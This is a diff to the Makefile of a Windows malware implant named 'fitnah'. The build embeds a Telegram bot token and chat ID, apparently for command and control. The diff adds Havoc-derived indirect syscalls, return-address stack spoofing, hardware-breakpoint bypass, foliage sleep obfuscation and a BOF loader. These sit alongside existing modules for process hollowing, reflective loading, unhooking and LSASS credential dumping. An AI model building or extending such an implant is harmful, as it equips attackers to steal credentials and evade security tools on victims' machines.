@@ -29,7 +29,6 @@ JITTER     ?= 20
 # ── Output ────────────────────────────────────────────────────────────────────
 OUTDIR     = ../build
 TARGET     = $(OUTDIR)/fitnah$(SUFFIX).exe
-ASM_OBJ    = $(OUTDIR)/syscalls.obj
 
 # ── Sources ───────────────────────────────────────────────────────────────────
 
@@ -42,21 +41,31 @@ SRCS_CORE = fitnah_implant.c \
             src/commands.c
 
 # Syscall layer (assembled from NASM)
-ASM_SRC   = ../fitnah/implant/asm/syscalls.asm
+# indirect_syscall.x64.asm — indirect syscall stubs (Havoc-adapted)
+# stack_spoof.x64.asm      — gadget-based return address spoofing (Havoc)
+ASM_SRCS  = ../fitnah/implant/asm/syscalls.asm              \
+            ../fitnah/implant/asm/indirect_syscall.x64.asm  \
+            ../fitnah/implant/asm/stack_spoof.x64.asm
+ASM_OBJS  = $(OUTDIR)/syscalls.obj              \
+            $(OUTDIR)/indirect_syscall.obj      \
+            $(OUTDIR)/stack_spoof.obj
 
-# Injection / loading
-SRCS_INJECT = ../fitnah/implant/syscall/direct_syscall.c   \
-              ../fitnah/implant/injection/rdi_loader.c      \
-              ../fitnah/implant/injection/code_cave.c       \
-              ../fitnah/implant/injection/process_mirror.c  \
-              ../fitnah/implant/process_hollowing.c         \
-              ../fitnah/implant/reflective_loader.c
+# Syscall / injection / loading
+SRCS_INJECT = ../fitnah/implant/syscall/indirect_syscall.c  \
+              ../fitnah/implant/injection/rdi_loader.c       \
+              ../fitnah/implant/injection/code_cave.c        \
+              ../fitnah/implant/injection/process_mirror.c   \
+              ../fitnah/implant/process_hollowing.c          \
+              ../fitnah/implant/reflective_loader.c          \
+              ../fitnah/implant/loader/bof_loader.c
 
-# Evasion
-SRCS_EVASION = ../fitnah/implant/evasion/memory_patcher.c      \
-               ../fitnah/implant/evasion/unhook.c               \
-               ../fitnah/implant/evasion/anti_analysis.c        \
-               ../fitnah/implant/evasion/sleep_obfuscation.c
+# Evasion — upgraded with Havoc evasion techniques
+SRCS_EVASION = ../fitnah/implant/evasion/foliage_obf.c      \
+               ../fitnah/implant/evasion/stack_spoof.c       \
+               ../fitnah/implant/evasion/hwbp_bypass.c       \
+               ../fitnah/implant/evasion/memory_patcher.c    \
+               ../fitnah/implant/evasion/unhook.c            \
+               ../fitnah/implant/evasion/anti_analysis.c
 
 # Collection / exploitation
 SRCS_OPS  = ../fitnah/implant/collection/lsass_dump.c \
@@ -76,7 +85,9 @@ INCLUDES = -Isrc \
            -I../fitnah/implant/collection \
            -I../fitnah/implant/exploits \
            -I../fitnah/implant/impact \
-           -I../fitnah/implant/syscall
+           -I../fitnah/implant/syscall \
+           -I../fitnah/implant/loader \
+           -I../fitnah/implant/asm
 
 DEFINES  = -DFITNAH_BOT_TOKEN=$(TOKEN)   \
            -DFITNAH_CHAT_ID=$(CHAT_ID)   \
@@ -94,15 +105,21 @@ LDFLAGS  = -lwininet -lbcrypt -lntdll -lgdi32 -luser32 -ladvapi32 \
 # ── Targets ───────────────────────────────────────────────────────────────────
 .PHONY: all clean
 
-all: $(OUTDIR) $(ASM_OBJ)
-	$(CC) $(SRCS) $(ASM_OBJ) $(INCLUDES) $(DEFINES) $(CFLAGS) $(LDFLAGS) -o $(TARGET)
+all: $(OUTDIR) $(ASM_OBJS)
+	$(CC) $(SRCS) $(ASM_OBJS) $(INCLUDES) $(DEFINES) $(CFLAGS) $(LDFLAGS) -o $(TARGET)
 	@echo "[+] Built: $(TARGET)"
 
-$(ASM_OBJ): $(ASM_SRC) | $(OUTDIR)
-	$(AS) $(ASM_SRC) -o $(ASM_OBJ)
+$(OUTDIR)/syscalls.obj: ../fitnah/implant/asm/syscalls.asm | $(OUTDIR)
+	$(AS) $< -o $@
+
+$(OUTDIR)/indirect_syscall.obj: ../fitnah/implant/asm/indirect_syscall.x64.asm | $(OUTDIR)
+	$(AS) $< -o $@
+
+$(OUTDIR)/stack_spoof.obj: ../fitnah/implant/asm/stack_spoof.x64.asm | $(OUTDIR)
+	$(AS) $< -o $@
 
 $(OUTDIR):
 	mkdir -p $(OUTDIR)
 
 clean:
-	rm -f $(OUTDIR)/fitnah*.exe $(OUTDIR)/fitnah*.bin $(OUTDIR)/syscalls.obj
+	rm -f $(OUTDIR)/fitnah*.exe $(OUTDIR)/fitnah*.bin $(OUTDIR)/*.obj
